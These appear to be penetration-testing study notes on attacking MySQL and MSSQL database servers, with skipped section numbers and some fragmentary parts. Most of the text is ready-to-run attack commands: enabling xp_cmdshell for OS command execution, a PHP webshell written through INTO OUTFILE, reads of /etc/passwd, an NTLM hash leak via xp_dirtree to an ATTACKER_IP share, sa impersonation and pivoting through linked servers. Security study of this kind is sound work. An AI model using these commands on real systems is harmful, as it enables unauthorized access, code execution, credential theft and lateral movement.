
# 🔴 ATTACKING SQL DATABASES —

---

# 🟢 1. WHY DATABASES ARE HIGH-VALUE TARGETS

- Store **sensitive data**:
    
    - Credentials (usernames/passwords)
        
    - PII (Personal Identifiable Information)
        
    - Business data
        
    - Payment details
        
- Often run with **high privileges**
    
- Compromise ⇒
    
    - Data theft
        
    - Privilege escalation
        
    - Lateral movement

# 🟢 3. ENUMERATION (FIRST STEP)

### 🔹 Nmap Scan

```bash
nmap -Pn -sV -sC -p1433 <IP>
```

### 🔹 What you get:

- Version (e.g., SQL Server 2017)
    
- Hostname
    
- Domain info
    
- SSL info
    

👉 Use this to:

- Identify vulnerabilities
    
- Find misconfigurations

## 🔹 MSSQL

- Uses Active Directory
    
- No need to re-enter password
    
- Integrated security
    

### 2. Mixed Mode

- Windows + SQL login
    
- Username/password stored in DB

## 🔹 MySQL

# 🟢 5. IMPORTANT VULNERABILITY

### 🔥 CVE-2012-2122 (MySQL)

- Timing attack
    
- Repeated wrong password ⇒ bypass auth
    
- Server responds faster for correct password
    

👉 Result:

- Login bypass possible
    

---

# 🟢 6. MISCONFIGURATIONS

- Anonymous login enabled
    
- Empty passwords
    
- Over-permissive access (any user/machine)
    

👉 Leads to:

- Unauthorized DB access

# 🟢 9. CONNECTING TO DATABASES

## 🔹 MySQL

```bash
mysql -u julio -pPassword123 -h <IP>
```

## 🔹 MSSQL (Windows)

```bash
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

## 🔹 MSSQL (Linux)

```bash
sqsh -S <IP> -U julio -P 'MyPassword!' -h
```

## 🔹 Windows Auth

```bash
sqsh -S <IP> -U .\\julio -P 'MyPassword!' -h
```

## 🔹 Impacket

```bash
mssqlclient.py julio@<IP>
```

# 🟢 12. COMMAND EXECUTION (VERY IMPORTANT)

## 🔹 MSSQL → xp_cmdshell

```sql
xp_cmdshell 'whoami';
```

### 🔸 Enable it:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### 🔹 Key Points:

- Disabled by default
    
- Runs as SQL service account
    
- Executes OS commands

# 🟢 13. FILE WRITE ATTACK

## 🔹 MySQL (Webshell)

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" 
INTO OUTFILE '/var/www/html/webshell.php';
```

## 🔹 Condition:

```sql
SHOW VARIABLES LIKE "secure_file_priv";
```

### Cases:

- Empty → FULL access (vulnerable)
    
- Directory → restricted
    
- NULL → disabled
    

---

## 🔹 MSSQL File Write

### Enable:

```sql
sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

### Create file:

```sql
sp_OACreate 'Scripting.FileSystemObject'
sp_OAMethod ...
```

👉 Used to drop webshell

# 🟢 14. FILE READ ATTACK

## 🔹 MSSQL

```sql
SELECT * FROM OPENROWSET(
BULK 'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
```

## 🔹 MySQL

```sql
SELECT LOAD_FILE("/etc/passwd");
```

# 🟢 15. HASH CAPTURE (VERY IMPORTANT)

## 🔹 MSSQL → NTLM Hash Leak

```sql
EXEC master..xp_dirtree '\\ATTACKER_IP\share\';
```

OR

```sql
EXEC master..xp_subdirs '\\ATTACKER_IP\share\';
```

### 🔹 Flow:

1. Start Responder / SMB server
    
2. Run query
    
3. Server connects → sends NTLM hash
    

👉 Use hash for:

- Cracking
    
- Relay attacks

# 🟢 16. IMPERSONATION (PRIV ESC)

## 🔹 Find users:

```sql
SELECT name FROM sys.server_principals;
```

## 🔹 Check role:

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## 🔹 Impersonate:

```sql
EXECUTE AS LOGIN = 'sa';
```

## 🔹 Revert:

```sql
REVERT;
```

👉 If SA → full control

---

# 🟢 17. LINKED SERVERS (LATERAL MOVEMENT)

## 🔹 Find:

```sql
SELECT srvname, isremote FROM sysservers;
```

## 🔹 Execute on remote:

```sql
EXECUTE('SELECT @@version') AT [server];
```

👉 If sysadmin on remote:

- Full compromise of another DB
